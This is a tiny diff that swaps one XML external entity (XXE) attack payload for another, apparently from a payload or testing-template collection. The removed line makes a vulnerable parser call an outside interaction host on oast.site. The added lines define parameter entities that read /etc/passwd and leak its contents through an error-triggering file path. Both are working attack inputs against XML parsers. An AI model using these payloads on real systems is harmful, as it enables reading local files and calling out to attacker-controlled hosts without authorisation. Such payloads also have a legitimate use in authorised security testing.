@@ -1,1 +1,4 @@
-<!DOCTYPE ANY[<!ENTITY % xxe SYSTEM 'https://b1mwvqcmmyhni2ki7i2etv1rdyc87vvyj.oast.site'>%xxe;]>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
